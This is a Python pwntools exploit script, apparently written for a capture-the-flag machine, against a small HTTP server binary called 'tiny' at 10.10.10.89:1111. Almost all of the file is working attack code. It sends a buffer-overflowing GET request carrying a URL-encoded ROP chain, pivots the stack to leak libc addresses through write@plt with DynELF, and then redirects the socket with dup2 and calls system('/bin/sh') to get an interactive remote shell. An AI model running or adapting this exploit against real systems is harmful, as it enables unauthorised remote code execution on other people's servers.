#!/usr/bin/env python

import time, urllib
from pwn import *

context(arch='amd64', word_size=64, os='linux')

elf = ELF('./tiny')
rop = ROP('./tiny')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
#ADDR = '127.0.0.1'
ADDR = '10.10.10.89'
PORT = 1111

'''
0x0000000000401fd0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x00000000004011d8 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401787 : pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004011dc : pop r15 ; ret
'''

elf.checksec()

def p64u(x):
	return urllib.quote_plus(struct.pack('<Q', x))

r = remote(ADDR, PORT)

rop =  p64u(0x4011dd)			# pop rdi ; ret
rop += p64u(0x4)				# sockfd
rop += p64u(0x4011db)			# pop rsi ; pop r15 ; ret
rop += p64u(0x603270)			# rwx addr
rop += p64u(0xffffffffffffffff)	# garbage for r15
rop += p64u(0x400cf0)			# <read@plt>
rop += p64u(0x40178a)			# pop rsp ; ret
rop += p64u(0x603270)			# rwx addr

r.send('GET ' + 'A'*568 + rop + '\n\n')
r.recvuntil('File not found')

'''
0x0000000000401fd0 : mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
0x00000000004011d8 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401787 : pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004011dc : pop r15 ; ret
'''

@MemLeak
def leak(addr, length = 0x100):

	rop =  p64(0x4011d8)			# pop r13 ; pop r14 ; pop r15 ; ret
	rop += p64(length)
	rop += p64(addr)
	rop += p64(0x4)					# sockfd
	rop += p64(0x401787)			# pop rbx ; pop rbp ; pop r12 ; ret
	rop += p64(0x0)
	rop += p64(0x4011dc)
	rop += p64(0x6032a0)
	rop += p64(0x401fd0)			# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
	rop += p64(0x400c50)			# <write@plt>
	rop += p64(0x4011d8)			# pop r13 ; pop r14 ; pop r15 ; ret
	rop += p64(0x100)
	rop += p64(0x603270)			# rwx addr 
	rop += p64(0x4)					# sockfd
	rop += p64(0x401787)			# pop rbx ; pop rbp ; pop r12 ; ret
	rop += p64(0x0)
	rop += p64(0x4011dc)
	rop += p64(0x6032a0)
	rop += p64(0x401fd0)			# mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
	rop += p64(0x400cf0)			# <read@plt>
	rop += p64(0x40178a)			# pop rsp ; ret
	rop += p64(0x603270)			# rwx addr
	
	r.send(rop + '\n')

	data = r.recv(10000)

	#print "Leaked %#x\n%s" % (addr, hexdump(data))
	#time.sleep(1)

	return data

def exploit(dup2, system):

	rop =  p64(0x4011dd)			# pop rdi ; ret
	rop += p64(0x4)					# sockfd
	rop += p64(0x4011db)			# pop rsi ; pop r15 ; ret
	rop += p64(0x0)					# stdin
	rop += p64(0xffffffffffffffff)	# garbage for r15
	rop += p64(dup2)				# <dup2>
	rop += p64(0x4011db)			# pop rsi ; pop r15 ; ret
	rop += p64(0x1)					# stdout
	rop += p64(0xffffffffffffffff)	# garbage for r15
	rop += p64(dup2)				# <dup2>
	rop += p64(0x4011db)			# pop rsi ; pop r15 ; ret
	rop += p64(0x2)					# stderr
	rop += p64(0xffffffffffffffff)	# garbage for r15
	rop += p64(dup2)				# <dup2>
	rop += p64(0x4011dd)			# pop rdi ; ret
	rop += p64(0x6032f8)			# /bin/bash
	rop += p64(system)				# system@libc
	rop += '/bin/sh'
	
	r.send(rop + '\n')

'''
#print leak(0x7FC4F823C000)
raw_input('continue')
leak(0x603088)
raw_input('continue')
#leak(0x603089)
leak(0x7fe1d49bc510)
raw_input('continue')
leak(0x60308a)
'''

de = DynELF(leak, elf = elf)

system = de.lookup('system', 'libc')
log.success("leaked system addr: 0x%x" % system)

dup2 = de.lookup('dup2', 'libc')
log.success("leaked dup2 addr: 0x%x" % dup2)

exploit(dup2, system)
r.interactive()

#r.send(p64(0xffffffffffffffff) + '\n')

r.close()
